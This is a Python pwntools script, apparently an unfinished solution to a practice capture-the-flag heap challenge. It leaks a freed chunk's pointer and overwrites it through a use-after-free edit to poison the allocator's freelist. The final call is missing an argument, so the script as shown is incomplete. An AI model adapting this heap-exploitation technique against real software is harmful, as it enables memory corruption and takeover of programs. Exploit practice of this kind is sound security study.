from pwn import *

global p
context.terminal = ['tmux', 'splitw', '-h']
 
def menu():
    p.recvuntil("Choice: ")

def make(index,name):
    log.info("Make: {}".format(index))
    p.sendline("a")
    p.recvuntil("Clone ID:",timeout=0.1)
    p.sendline(str(index))
    p.recvuntil("Enter Name")
    p.sendline(name)
    menu()

def edit(index,name):
    log.info("Edit: {}".format(index))
    p.sendline("c")
    p.recvuntil("Clone ID: ",timeout=0.1)
    p.sendline(str(index))
    p.recvuntil("Enter Name")
    p.sendline(name)
    menu()

def kill(index):
    log.info("Kill: {}".format(index))
    p.sendline("b")
    p.recvuntil("Clone ID:")
    p.sendline(str(index))
    menu()

def view(index):
    log.info("View: {}".format(index))
    p.sendline("d")
    p.recvuntil("Clone ID: ",timeout=0.1)
    p.sendline(str(index))
    q = p.recvuntil("Name: ",timeout=0.1)
    fd = unpack(p.recv(6), word_size=8*6, endianness="little")
    # bk = u32(p.recv(4))
    p.recv(1)
    print hex(fd)
    # print hex(bk)
    menu()
    return fd

def hint(index):
    log.info("Hint: {}".format(index))
    p.sendline("h")
    p.recvuntil("Clone ID: ",timeout=0.1)
    p.sendline(str(index))
    return p.recvline()

p = process("./prac")
# gdb.attach(p, gdbscript="break 171;")

#need to get leak for win
print("hi")
menu()
make(0, "hi")
make(1, "bye")
kill(0)
hint(1)
hint(0)
addr = view(0)
print(hex(addr))
edit(0, p64(addr-24))
make(0, "junk")
make(1,); 
# print("hi")
p.interactive()

